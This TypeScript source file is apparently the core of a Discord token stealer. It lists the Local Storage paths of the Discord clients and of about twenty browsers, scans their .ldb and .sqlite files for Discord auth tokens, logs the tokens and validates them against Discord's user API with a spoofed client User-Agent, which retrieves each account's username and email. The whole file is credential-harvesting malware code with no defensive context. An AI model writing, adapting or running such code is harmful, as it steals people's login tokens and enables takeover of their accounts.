import fs from 'fs';
import path from 'path';
import crypto from 'crypto';
import fetch from 'node-fetch';

export interface UserData {
  id: string;
  username: string;
  discriminator: string;
  email: string;
}

export interface TokenData {
  token: string;
  userData?: UserData;
}

const appDataPath = process.env.APPDATA || '';
const localAppDataPath = process.env.LOCALAPPDATA || '';

const appsPaths: Record<string, string> = {
    'Discord Client': `${appDataPath}\\discord\\Local Storage\\leveldb`,
    'Discord Canary Client': `${appDataPath}\\discordcanary\\Local Storage\\leveldb`,
    'Discord PTB Client': `${appDataPath}\\discordptb\\Local Storage\\leveldb`,
    '7Star': `${localAppDataPath}\\7Star\\7Star\\User Data\\Local Storage\\leveldb`,
    'Amigo': `${localAppDataPath}\\Amigo\\User Data\\Local Storage\\leveldb`,
    'Brave': `${localAppDataPath}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb`,
    'CentBrowser': `${localAppDataPath}\\CentBrowser\\User Data\\Local Storage\\leveldb`,
    'Chrome SxS': `${localAppDataPath}\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb`,
    'Chrome': `${localAppDataPath}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb`,
    'Epic Privacy Browser': `${localAppDataPath}\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb`,
    'Firefox': `${appDataPath}\\Mozilla\\Firefox\\Profiles`,
    'Iridium': `${localAppDataPath}\\Iridium\\User Data\\Default\\Local Storage\\leveldb`,
    'Kometa': `${localAppDataPath}\\Kometa\\User Data\\Local Storage\\leveldb`,
    'Microsoft Edge': `${localAppDataPath}\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb`,
    'Opera GX': `${appDataPath}\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb`,
    'Opera': `${appDataPath}\\Opera Software\\Opera Stable\\Local Storage\\leveldb`,
    'Orbitum': `${localAppDataPath}\\Orbitum\\User Data\\Local Storage\\leveldb`,
    'Sputnik': `${localAppDataPath}\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb`,
    'Torch': `${localAppDataPath}\\Torch\\User Data\\Local Storage\\leveldb`,
    'Ungoogled Chromium': `${localAppDataPath}\\Chromium\\User Data\\Default\\Local Storage\\leveldb`,
    'Uran': `${localAppDataPath}\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb`,
    'Vivaldi': `${localAppDataPath}\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb`,
    'Yandex': `${localAppDataPath}\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb`,
  };


async function walkFs(dir: string): Promise<string[]> {
  const dirFiles = await fs.promises.readdir(dir);
  const files = await Promise.all(
    dirFiles.map(async file => {
      const filePath = path.join(dir, file);
      const stats = await fs.promises.stat(filePath);
      if (stats.isDirectory()) return walkFs(filePath);
      else if (stats.isFile()) return filePath;
      return [];
    })
  );
  return files.flat();
}

export async function extractTokens(): Promise<TokenData[]> {
  const tokens = new Set<string>();
  let pathsToCheck = Object.entries(appsPaths);

  // Check for profile directories
  pathsToCheck
    .filter(([appName, appPath]) => appPath.includes('Default') && fs.existsSync(appPath.replace(/\\Default.*/, '')))
    .forEach(([appName, appPath]) => {
      fs.readdirSync(appPath.replace(/\\Default.*/, ''))
        .filter(file => file.startsWith('Profile '))
        .forEach(file => pathsToCheck.push([`${appName} ${file}`, appPath.replace('Default', file)]));
    });

  for (const [appName, appPath] of pathsToCheck) {
    if (!fs.existsSync(appPath)) {
      console.log(`Skip ${appName} (not found) - ${appPath}`);
      continue;
    }

    console.log(`Look in ${appName} - ${appPath}`);

    if (appName.toLowerCase().includes('discord')) {
      const files = await fs.promises.readdir(appPath);
      await Promise.all(
        files
          .filter(f => f.endsWith('.ldb'))
          .map(async file => {
            const content = await fs.promises.readFile(
                path.join(appPath, file), 'utf8');
            [...content.matchAll(/\"(dQw4w9WgXcQ:.*?)\"/g)]
              .filter(x => x.length >= 2)
              .map(x => x[1])
              .forEach(token => {
                console.log(`  Found token ${token}`);
                tokens.add(token);
              });
          })
      );
    } else if (appName.toLowerCase().includes('firefox')) {
      const files = await walkFs(appPath);
      await Promise.all(
        files
          .filter(f => f.endsWith('.sqlite'))
          .map(async file => {
            const content = await fs.promises.readFile(file, 'utf8');
            [...content.matchAll(/([\w-]{24}\.[\w-]{6}\.[\w-]{25,110})/g)]
              .filter(x => x.length >= 2)
              .map(x => x[1])
              .forEach(token => {
                console.log(`  Found token ${token}`);
                tokens.add(token);
              });
          })
      );
    } else {
      const files = await fs.promises.readdir(appPath);
      await Promise.all(
        files
          .filter(f => f.endsWith('.ldb'))
          .map(async file => {
            const content = await fs.promises.readFile(path.join(appPath, file), 'utf8');
            [...content.matchAll(/([\w-]{24}\.[\w-]{6}\.[\w-]{25,110})/g)]
              .filter(x => x.length >= 2)
              .map(x => x[1])
              .forEach(token => {
                console.log(`Found token ${token}`);
                tokens.add(token);
              });
          })
      );
    }
  }

  const tokenData: TokenData[] = await Promise.all(
    [...tokens].map(async token => {
      const userData = await getUserData(token).catch(() => null);
      return { token, userData: userData || undefined };
    })
  );

  return tokenData;
}

async function getUserData(token: string): Promise<any> {
    const res = await fetch(`https://discordapp.com/api/v9/users/@me`, {
        headers: {
          Authorization: token,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9005 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36',
        },
      });
      
      if (!res.ok) throw new Error('Invalid Discord token');
    
      const data: any = await res.json();
      return data;
}
